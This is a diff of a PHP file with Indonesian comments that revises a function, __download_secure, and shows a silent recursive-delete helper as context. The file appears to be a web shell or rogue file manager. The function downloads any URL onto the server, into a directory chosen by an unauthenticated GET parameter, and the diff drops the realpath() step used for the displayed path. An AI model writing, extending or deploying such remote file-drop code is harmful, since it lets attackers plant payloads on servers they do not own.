@@ -59,39 +59,41 @@ return$t;}
 function xrmdir($d){$it=@scandir($d);if(!$it)return;foreach($it as $i){if($i=='.'||$i=='..')continue;$p="$d/$i";if(is_dir($p))xrmdir($p);else@unlink($p);}rmdir($d);}
 
 function __download_secure($url, $optname = '') {
-    // Direktori aktif (GET path) atau direktori skrip
-    $base = isset($_GET['path']) && is_dir($_GET['path']) ? $_GET['path'] : dirname(__FILE__);
+    // Tentukan direktori aktif
+    $reqPath = isset($_GET['path']) ? $_GET['path'] : getcwd();
+    $base = is_dir($reqPath) ? $reqPath : dirname(__FILE__);
 
     if (!filter_var($url, FILTER_VALIDATE_URL)) {
         return ['ok' => false, 'err' => 'Invalid URL', 'path' => null];
     }
 
-    // Nama file aman
+    // Nama file
     $basename = basename(parse_url($url, PHP_URL_PATH) ?? 'download.bin');
     $basename = preg_replace('/[^A-Za-z0-9._-]/', '_', $basename);
     $filename = $optname
         ? preg_replace('/[^A-Za-z0-9._-]/', '_', basename($optname))
         : $basename;
 
-    $target = rtrim($base, '/')."/".$filename;
+    $target = rtrim($base, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
     $ok = false; $err = '';
 
-    // Gunakan cURL jika tersedia
+    // --- cURL method ---
     if (function_exists('curl_init')) {
         $ch = curl_init($url);
         $fp = @fopen($target, 'w');
         if ($fp) {
             curl_setopt_array($ch, [
                 CURLOPT_FILE => $fp,
-                CURLOPT_FOLLOWLOCATION => 1,
+                CURLOPT_FOLLOWLOCATION => true,
                 CURLOPT_TIMEOUT => 90,
-                CURLOPT_FAILONERROR => true,
+                CURLOPT_FAILONERROR => true
             ]);
             curl_exec($ch);
             $cerr = curl_error($ch);
             $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
             curl_close($ch);
             fclose($fp);
+
             if (!$cerr && $code < 400 && is_file($target)) {
                 $ok = true;
             } else {
@@ -99,11 +101,11 @@ function __download_secure($url, $optname = '') {
                 $err = $cerr ?: "HTTP $code";
             }
         } else {
-            $err = 'Write failed';
+            $err = 'Cannot write file';
         }
     }
 
-    // Fallback tanpa cURL
+    // --- Fallback file_get_contents ---
     if (!$ok) {
         $data = @file_get_contents($url);
         if ($data !== false && @file_put_contents($target, $data) !== false) {
@@ -115,8 +117,9 @@ function __download_secure($url, $optname = '') {
 
     if ($ok) @chmod($target, 0644);
 
-    // Buat path relatif untuk tampilan (tanpa absolute dir)
-    $relative = str_replace(dirname(__FILE__), '.', realpath($target));
+    // Path relatif aman
+    $relative = str_replace(dirname(__FILE__), '.', $target);
+    $relative = str_replace('//', '/', $relative);
 
     return ['ok' => $ok, 'err' => $err, 'path' => $relative];
 }
